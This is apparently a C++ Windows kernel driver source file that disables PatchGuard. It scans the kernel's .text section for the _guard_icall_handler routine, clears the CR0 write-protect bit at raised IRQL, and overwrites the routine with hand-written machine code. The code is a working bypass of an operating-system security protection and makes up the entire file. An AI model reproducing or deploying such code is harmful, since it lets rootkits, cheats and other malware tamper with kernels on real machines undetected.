#include <ntifs.h>
#include <ntimage.h>
#include <intrin.h>

#define uint32_t unsigned long
#define uint16_t unsigned short


extern "C" uintptr_t GetKernelBase();
void easy_anti_patchguard(uintptr_t search_base) {

	const auto dos_header = reinterpret_cast<PIMAGE_DOS_HEADER>(search_base);
	const auto pNtHeader = reinterpret_cast<PIMAGE_NT_HEADERS>(reinterpret_cast<PUCHAR>(search_base) + dos_header->e_lfanew);
	const auto section_size = pNtHeader->FileHeader.NumberOfSections;
	const auto sections_array = reinterpret_cast<PIMAGE_SECTION_HEADER>(reinterpret_cast<PUCHAR>(pNtHeader) + sizeof(
		IMAGE_NT_HEADERS));

	for (auto i = 0; i < section_size; i++) {
		if (*reinterpret_cast<uint32_t*>(sections_array[i].Name) == 0x7865742E) {
			const auto scan_base = (PUCHAR)(search_base)+sections_array[i].VirtualAddress;
			const auto scan_size = max(sections_array[i].SizeOfRawData, sections_array[i].Misc.VirtualSize);
			for (int i = 0; i < scan_size - 10; i++) {
				const auto p1 = *reinterpret_cast<uint32_t*>(scan_base + i) & 0x00ffffff;
				const auto p2 = *reinterpret_cast<uint32_t*>(scan_base + i + 6) & 0xffffff00;
				if (p1 == 0x1D8B4C && p2 == 0xC0854800) {
					/*
					cmp     dword ptr ds:[rax], 0x1131482E   //     xor     qword ptr cs:[rcx],rdx
					je      ret:
					jmp     rax
					ret
					 */
					const auto _guard_icall_handler = scan_base + i;
					DbgPrint("_guard_icall_handler:%p\n", _guard_icall_handler);
					unsigned char patch_code[] = { 0x81, 0x38, 0x2E, 0x48, 0x31, 0x11, 0x74, 0x02, 0xFF, 0xE0, 0xC3 };
					const auto irql = __readcr8();
					KeRaiseIrqlToDpcLevel();
					__writecr0(__readcr0() & 0xfffffffffffeffff);
					memcpy(_guard_icall_handler, patch_code, sizeof(patch_code));
					__writecr0(__readcr0() | 0x10000);
					__writecr8(irql);
					break;
				}
			}
			break;
		}
	}

}


EXTERN_C
NTSTATUS DriverEntry(
	IN PDRIVER_OBJECT DriverObject,
	IN PUNICODE_STRING RegistryPath
) {
	easy_anti_patchguard(GetKernelBase());
	return STATUS_UNSUCCESSFUL;
}